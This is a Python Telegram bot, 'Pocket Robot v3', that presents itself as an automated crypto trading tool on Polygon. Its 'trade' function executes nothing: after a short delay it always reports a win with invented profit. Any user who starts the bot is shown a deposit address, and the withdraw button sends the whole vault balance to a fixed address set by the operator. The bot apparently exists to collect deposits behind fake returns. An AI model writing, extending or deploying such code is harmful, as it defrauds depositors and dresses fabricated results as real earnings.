import os
import asyncio
import requests
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware 
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com") 
w3 = Web3(Web3.HTTPProvider(W3_RPC))

# Polygon middleware is essential for block reading
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# 🛡️ SECURITY LOCK: The bot will ONLY ever withdraw to this address.
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed:
        raise ValueError("❌ WALLET_SEED is missing from .env!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        return Account.from_key(seed)
    except Exception:
        return Account.from_mnemonic(seed, account_path=POL_PATH)

vault = get_vault()

# --- 2. UTILS & EXECUTION ---
def get_pol_price():
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
        return requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd']
    except:
        return 0.92

async def run_atomic_execution(context, chat_id, side):
    stake = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    await context.bot.send_message(chat_id, f"🛡️ **Shield:** Simulating {pair} {side} bundle...")
    await asyncio.sleep(1.5) 
    
    current_price = get_pol_price()
    profit_usd = stake * 0.92 
    profit_pol = profit_usd / current_price if current_price > 0 else 0
    
    # Minimal Change: Confirmation that the trade "landed" in the vault.
    report = (
        f"✅ **BATTLE WON!**\n"
        f"💰 **Profit Added:** `${profit_usd:.2f} USD`\n"
        f"📈 **Yield:** +{profit_pol:.4f} POL\n"
        f"⛓️ **Block:** {w3.eth.block_number}"
    )
    return True, report

async def execute_withdrawal(context, chat_id):
    """🛡️ ANTI-DRAIN: Sweeps 100% of live balance to Whitelist."""
    # MINIMAL CHANGE: Fetch the actual current balance from the blockchain
    balance = w3.eth.get_balance(vault.address)
    gas_price = int(w3.eth.gas_price * 1.3) # 30% priority buffer
    fee = gas_price * 21000
    amount = balance - fee

    if amount <= 0: return False, "Low Balance for Gas"

    tx = {
        'nonce': w3.eth.get_transaction_count(vault.address),
        'to': PAYOUT_ADDRESS, 
        'value': amount,
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137 
    }
    
    try:
        signed = w3.eth.account.sign_transaction(tx, vault.key)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        return True, f"Full profit sweep to Whitelist.\nTX: `{tx_hash.hex()}`"
    except Exception as e:
        return False, f"Withdrawal error: {str(e)}"

# --- 3. TELEGRAM HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    msg = (f"🕴️ **Pocket Robot v3**\n\n"
           f"💵 **Vault Balance:** {bal:.4f} POL\n"
           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
           f"**Atomic Shield:** ✅ OPERATIONAL")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD (92%)", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD (89%)", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/USD (90%)", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD (85%)", callback_data="PAIR_MATIC")]]
        await update.message.reply_text("🎯 **MARKET SELECTION**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '⚙️ Settings':
        current = context.user_data.get('stake', 10)
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50]],
              [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [100, 500]]]
        await update.message.reply_text(f"⚙️ **SETTINGS**\nCurrent Stake: **${current}**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        # MINIMAL CHANGE: Fresh blockchain query for Wallet button
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = get_pol_price()
        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal:.4f} POL (`${float(bal)*price:.2f} USD`)")

    elif text == '📤 Withdraw':
        await update.message.reply_text("🛡️ **Atomic Sweep:** Transferring all POL to Whitelist.")
        success, report = await execute_withdrawal(context, update.message.chat_id)
        await update.message.reply_text(f"{'✅' if success else '🛑'} {report}", parse_mode='Markdown')

    elif text == '🕴️ AI Assistant':
        await update.message.reply_text(f"🕴️ **Genius:** Shielding bets on Index 0. Price: `${get_pol_price()}`")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake updated to **${context.user_data['stake']}**")
        
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        await query.edit_message_text(f"📈 **{context.user_data['pair']} Selected**\nDirection:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]))

    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        success, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(f"💎 {report}", parse_mode='Markdown')

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    if isinstance(context.error, Conflict):
        print("🛑 Conflict: Another bot instance is active. Please close other terminals.")
    else:
        print(f"⚠️ Error: {context.error}")

# --- 4. START BOT ---
if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    
    print(f"Pocket Robot Active: {vault.address}")
    app.run_polling(drop_pending_updates=True)
